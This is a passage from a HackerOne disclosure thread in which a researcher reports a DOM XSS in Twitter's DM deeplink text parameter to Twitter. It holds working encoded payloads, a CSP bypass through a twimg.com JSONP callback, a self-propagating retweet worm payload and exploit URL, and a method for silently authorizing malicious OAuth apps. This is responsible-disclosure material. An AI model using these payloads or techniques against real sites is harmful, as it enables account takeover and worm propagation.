Create a Direct Message deeplink by following the instructions on this [Twitter developer guide](https://developer.twitter.com/en/docs/direct-messages/welcome-messages/guides/deeplinking-to-welcome-message).\n  2. Use the following payload as the value for the text parameter:\n```\n%3C%3C/%3Cx%3E/script/test000%3E%3C%3C/%3Cx%3Esvg%20onload%3Dalert%28%29%3E%3C/%3E%3Cscript%3E1%3C%5Cx%3E2\n```\n  3. Tweet the deeplink you created. It should look like the following:\n```\nhttps://twitter.com/messages/compose?recipient_id=988260476659404801\u0026welcome_message_id=988274596427304964\u0026text=%3C%3C/%3Cx%3E/script/test000%3E%3C%3C/%3Cx%3Esvg%20onload%3Dalert%28%29%3E%3C/%3E%3Cscript%3E1%3C%5Cx%3E2\n```\n\n## Impact\n\nIt seems that the deployed CSP policy currently blocks the execution of arbitrary JavaScript code, however, arbitrary HTML tags can still be injection on `twitter.com` to carry out other kinds of attacks (i.e., deanonymization attacks, phishing, etc.). While you're in the process of verifying this, I'll be working on a bypass for the CSP policy in order to execute arbitrary JavaScript.\n\nThe hacker selected the **Cross-site Scripting (XSS) - DOM** weakness.

However, I wanted to make you aware that I've found a CSP bypass that could've turned this vulnerability into a fully-fledged XSS worm that executes on any modern web browser and can propagate throughout all active Twitter accounts.\n\nThe current Twitter CSP policy allows scripts from \"https://*.twimg.com\", and while the following JSONP endpoint \"https://syndication.twimg.com/timeline/profile?callback=\" prefixes the callback with a \"\\_\\_twttr\" prefix, this limitation can be bypassed by injecting an HTML element with this value \"\\_\\_twttr\" as an element ID.\n\nWhile the XSS vulnerability itself has already been fixed, if an attacker were to find a similar XSS issue, he could create a fully-fledged XSS worm using the following payload:\n```html\n\u003c/script\u003e\u003ciframe id=__twttr src=/intent/retweet?tweet_id=1114986988128624640\u003e\u003c/iframe\u003e\u003cscript src=//syndication.twimg.com/timeline/profile?callback=__twttr/alert;user_id=12\u003e\u003c/script\u003e\u003cscript src=//syndication.twimg.com/timeline/profile?callback=__twttr/frames[0].retweet_btn_form.submit;user_id=12\u003e\n```\n\n\nThe following is an exploit that would've leveraged this XSS issue alongside the CSP bypass in order to create the XSS worm:\n```\nhttps://twitter.com/messages/compose?recipient_id=988260476659404801\u0026welcome_message_id=988274596427304964\u0026text=%3C%3Cx%3E/script%3E%3C%3Cx%3Eiframe%20id%3D__twttr%20src%3D/intent/retweet%3Ftweet_id%3D1114986988128624640%3E%3C%3Cx%3E/iframe%3E%3C%3Cx%3Escript%20src%3D//syndication.twimg.com/timeline/profile%3Fcallback%3D__twttr/alert%3Buser_id%3D12%3E%3C%3Cx%3E/script%3E%3C%3Cx%3Escript%20src%3D//syndication.twimg.com/timeline/profile%3Fcallback%3D__twttr/frames%5B0%5D.retweet_btn_form.submit%3Buser_id%3D12%3E\n```\n\nNote: You can verify the CSP bypass by heading to \"https://twitter.com/i/cards/tfw/v1/1114986988128624640\" and executing this in the browser console (while logged in—tested on latest Chrome):\n```javascript\ndocument.write(document.body.innerHTML.replace(/\\\\\\\\\\//g,'/'));\n```\n\nIf you would like to fix the CSP bypass in order to mitigate the risk of such issues in the future, I might consider delaying the publication of my full write-up until then.\n\nLet me know what you think,\nThanks!","automated_response":false,"created_at":"2019-04-07T20:56:09.855Z","updated_at":"2019-04-07T21:06:26.536Z","actor":{"username":"0xsobky","cleared":false,"url":"/0xsobky","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/KUci7XnpJPBx2BXVZpjgovzZ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4548536,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nIf you'd like to take a look at the write-up before it's published publicly, you can read it at:\nhttps://gist.github.com/0xSobky/f97a4ce21d5cee9c78d83a53e59e1ab2\n\nLet me know if you've any comments.\nCheers!","automated_response":false,"created_at":"2019-04-12T15:29:38.413Z","updated_at":"2019-04-12T15:29:38.413Z","actor":{"username":"0xsobky","cleared":false,"url":"/0xsobky","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/KUci7XnpJPBx2BXVZpjgovzZ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4548818,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@0xsobky please request public disclosure through this ticket, thank you!","automated_response":false,"created_at":"2019-04-12T16:27:38.581Z","updated_at":"2019-04-12T16:27:38.581Z","actor":{"username":"acamacho","cleared":false,"url":"/acamacho","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4567892,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi 0xsobky,\n\nThat's a nice discovery.

An attacker could have exploited this issue to force a user to authorize any malicious app to access the user's account with full permissions. This is simply possible by loading the following endpoint `https://twitter.com/oauth/authorize?oauth_token=1YBDSQAAAAAA4_EbAAABaiyr63w` in an iframe element and then automatically submitting the form with the ID \"oauth_form\" within that page.\n\nAnd this would not have required any user interaction whatsoever. The only caveat is that the \"oauth_token\" value is valid for one use only and has a relatively short expiry time. But this is not much of a problem as this XSS would get triggered as soon as the malicious tweet loads on any user's timeline, and an attacker could post (and propagate) as many tweets as needed to compromise any number of accounts. \n\nI've put together an example exploit for this kind of attack in the following tweet (which attempts to load two other Twitter cards with additional payloads to silently execute such attack):\nhttps://twitter.com/kyoko6516713624/status/1118609831814934528\n\nYou could still verify this possibility even though the XSS has been fixed. That being said, I think this XSS issue affects a critical part of the app and should probably have been rewarded higher than the typical reward (for reference, this is obviously more severe than #85624).\n\nLet me know if it'd be possible to reassess the impact of this issue in light of this new information.\nThanks!","automated_response":false,"created_at":"2019-04-17T21:00:12.099Z","updated_at":"2019-04-17T21:02:14.896Z","actor":{"username":"0xsobky","cleared":false,"url":"/0xsobky","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/KUci7XnpJPBx2BXVZpjgovzZ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4588357,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Also, for what it's worth, I made a few attempts to bypass the fix currently implemented.
